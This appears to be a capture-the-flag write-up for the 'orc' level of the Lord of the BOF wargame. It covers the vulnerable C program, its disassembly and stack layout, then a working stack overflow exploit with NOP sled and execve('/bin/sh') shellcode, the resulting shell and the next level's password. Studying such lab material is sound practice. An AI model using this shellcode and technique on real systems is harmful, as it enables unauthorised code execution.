# Level 3, Goblin -> Orc

### orc.c
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

> `environ` is defined as a global variable in the Glibc source file `posix/environ.c`

### Analysis

#### Disassembling the "orc"
```
Dump of assembler code for function main:
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %ebp,%esp
0x8048503 <main+3>:     sub    %esp,44
0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:    jg     0x8048523 <main+35>
0x804850c <main+12>:    push   0x8048630
0x8048511 <main+17>:    call   0x8048410 <printf>
0x8048516 <main+22>:    add    %esp,4
0x8048519 <main+25>:    push   0
0x804851b <main+27>:    call   0x8048420 <exit>
0x8048520 <main+32>:    add    %esp,4
0x8048523 <main+35>:    nop
0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:    nop
0x804852c <main+44>:    lea    %esi,[%esi*1]
0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:    lea    %edx,[%eax*4]
0x804853a <main+58>:    mov    %eax,%ds:0x8049750
0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:    jne    0x8048547 <main+71>
0x8048545 <main+69>:    jmp    0x8048587 <main+135>
0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:    lea    %edx,[%eax*4]
0x8048551 <main+81>:    mov    %eax,%ds:0x8049750
0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:    push   %edx
0x804855a <main+90>:    call   0x80483f0 <strlen>
0x804855f <main+95>:    add    %esp,4
0x8048562 <main+98>:    mov    %eax,%eax
0x8048564 <main+100>:   push   %eax
0x8048565 <main+101>:   push   0
0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:   lea    %edx,[%eax*4]
0x8048571 <main+113>:   mov    %eax,%ds:0x8049750
0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:   push   %edx
0x804857a <main+122>:   call   0x8048430 <memset>
0x804857f <main+127>:   add    %esp,12
0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:   jmp    0x8048530 <main+48>
0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:   add    %eax,4
0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:   add    %edx,47
0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:   je     0x80485b0 <main+176>
0x8048597 <main+151>:   push   0x804863c
0x804859c <main+156>:   call   0x8048410 <printf>
0x80485a1 <main+161>:   add    %esp,4
0x80485a4 <main+164>:   push   0
0x80485a6 <main+166>:   call   0x8048420 <exit>
0x80485ab <main+171>:   add    %esp,4
0x80485ae <main+174>:   mov    %esi,%esi
0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:   add    %eax,4
0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:   push   %edx
0x80485b9 <main+185>:   lea    %eax,[%ebp-40]
0x80485bc <main+188>:   push   %eax
0x80485bd <main+189>:   call   0x8048440 <strcpy>
0x80485c2 <main+194>:   add    %esp,8
0x80485c5 <main+197>:   lea    %eax,[%ebp-40]
0x80485c8 <main+200>:   push   %eax
0x80485c9 <main+201>:   push   0x8048659
0x80485ce <main+206>:   call   0x8048410 <printf>
0x80485d3 <main+211>:   add    %esp,8
0x80485d6 <main+214>:   leave
0x80485d7 <main+215>:   ret
```

#### Estimated Stack Structure

```
|  int i (4 bytes)            |         [%ebp-44]
|  BUFFER (40 bytes)          |         [%ebp-40]
|  SFP (4 bytes)              |         [%ebp]
|  RET (4 bytes)              |         [%ebp+4]
|  ARGC (4 bytes)             |         [%ebp+8]
```

#### Observed Stack Structure (bp at *main+197)
```
(gdb) run `python -c "print 'A'*40+'BBBB'+'\xbf\xbf\xbf\xbf'"`

Starting program: /home/goblin/orc-co `python -c "print 'A'*40+'BBBB'+'\xbf\xbf\xbf\xbf'"`

Breakpoint 2, 0x80485c5 in main ()
(gdb) x/100x $esp
0xbffffabc:     0x00000015      0x41414141      0x41414141      0x41414141  -> int i, The 'buffer[40]'
0xbffffacc:     0x41414141      0x41414141      0x41414141      0x41414141  -> The 'buffer[40]'
0xbffffadc:     0x41414141      0x41414141      0x41414141      0x42424242  -> The 'buffer[40]', SFP
0xbffffaec:     0xbfbfbfbf      0x00000000      0xbffffb34      0xbffffb40  -> RET, ARGC, ARGV Pointer
0xbffffafc:     0x40013868      0x00000002      0x08048450      0x00000000
0xbffffb0c:     0x08048471      0x08048500      0x00000002      0xbffffb34
0xbffffb1c:     0x08048390      0x0804860c      0x4000ae60      0xbffffb2c
0xbffffb2c:     0x40013e90      0x00000002      0xbffffc32      0xbffffc46
0xbffffb3c:     0x00000000      0xbffffc77      0xbffffc88      0xbffffca1
0xbffffb4c:     0xbffffcc0      0xbffffce2      0xbffffcee      0xbffffeb1
0xbffffb5c:     0xbffffed0      0xbffffeec      0xbfffff01      0xbfffff1f
0xbffffb6c:     0xbfffff2a      0xbfffff39      0xbfffff41      0xbfffff52
0xbffffb7c:     0xbfffff5c      0xbfffff6a      0xbfffff7b      0xbfffff89
0xbffffb8c:     0xbfffff94      0xbfffffa6      0x00000000      0x00000003
0xbffffb9c:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffbac:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffbbc:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffbcc:     0x08048450      0x0000000b      0x000001f7      0x0000000c
0xbffffbdc:     0x000001f7      0x0000000d      0x000001f7      0x0000000e
0xbffffbec:     0x000001f7      0x00000010      0x0fabfbff      0x0000000f
0xbffffbfc:     0xbffffc2d      0x00000000      0x00000000      0x00000000
0xbffffc0c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc1c:     0x00000000      0x00000000      0x00000000      0x00000000
```

### Exploit

#### Payload Structure
```
'A'*40
+
'B'*4
+
'\xfc\xfa\xff\xbf'
+
'\x90'*100
+
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
```

#### Shellcode (24 bytes)
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload
```
./orc `python -c "print 'A'*44+'\x3c\xfa\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

### Result

```
[goblin@localhost goblin]$ ./orc `python -c "print 'A'*44+'\x3c\xfa\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
                           ̀
bash$ id
uid=503(goblin) gid=503(goblin) euid=504(orc) egid=504(orc) groups=503(goblin)
bash$ my-pass
euid = 504
cantata
```